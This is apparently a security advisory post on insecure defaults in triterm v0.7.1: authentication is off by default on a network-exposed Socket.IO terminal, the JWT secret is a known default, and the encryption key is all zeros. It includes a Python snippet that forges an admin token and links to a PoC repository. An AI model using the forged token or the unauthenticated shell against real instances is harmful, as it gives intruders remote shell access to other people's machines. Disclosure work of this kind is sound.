---
title: "triterm v0.7.1 — Auth Disabled by Default + Hardcoded JWT_SECRET = CVSS 10.0"
date: 2026-05-27 14:00:00 +0000
categories: [CVE, RCE]
tags: [triterm, websocket, jwt, insecure-defaults, rce]
---

## Overview

**Affected software:** vasandkumar/triterm v0.7.1  
**CVSS 3.1 (worst):** 10.0 Critical  
**Reported:** 2026-05-27 (GitHub issue #20)

Triterm is advertised as a "modern, secure web-based terminal manager with authentication and RBAC." In reality, the application ships with **all security mechanisms disabled by default**.

## The Irony

The codebase has excellent security code:
- JWT authentication with token revocation
- RBAC with role-based route protection
- CSRF protection
- Rate limiting
- Audit logging

None of it is turned on by default.

## FINDING-01 — REQUIRE_AUTH=false by Default (CVSS 10.0)

`.env.example`:
```
REQUIRE_AUTH=false   ← ships disabled
HOST=0.0.0.0         ← exposed to all interfaces
```

The Socket.IO middleware:
```typescript
const requireAuth = process.env.REQUIRE_AUTH === 'true';  // false by default

if (!token) {
  if (requireAuth) return next(new Error('Auth required'));
  next();  // ← unauthenticated clients proceed
}
```

Any unauthenticated Socket.IO client can call `create-terminal` and receive a full PTY shell.

## FINDING-02 — Default JWT_SECRET Allows Token Forgery (CVSS 9.1)

```
JWT_SECRET=your-secret-key-change-in-production
```

Even when a user manually enables `REQUIRE_AUTH=true`, the default secret is publicly known. Admin tokens can be forged trivially:

```python
import jwt
token = jwt.encode(
    {"userId": "x", "role": "ADMIN", "email": "x@x.com",
     "username": "admin", "exp": 9999999999},
    "your-secret-key-change-in-production",
    algorithm="HS256"
)
# Use this token against any default-config triterm instance
```

## FINDING-03 — All-Zero ENCRYPTION_KEY (CVSS 8.1)

```
ENCRYPTION_KEY=0000000000000000000000000000000000000000000000000000000000000000
```

OAuth access tokens (Google, GitHub, Microsoft) stored in the database are encrypted with this known key — anyone with DB access can decrypt them.

## PoC Code

[github.com/BlessedOn3/poc-triterm-auth-bypass](https://github.com/BlessedOn3/poc-triterm-auth-bypass)

## Timeline

| Date | Event |
|------|-------|
| 2026-05-27 | Vulnerabilities discovered |
| 2026-05-27 | GitHub issue #20 opened |
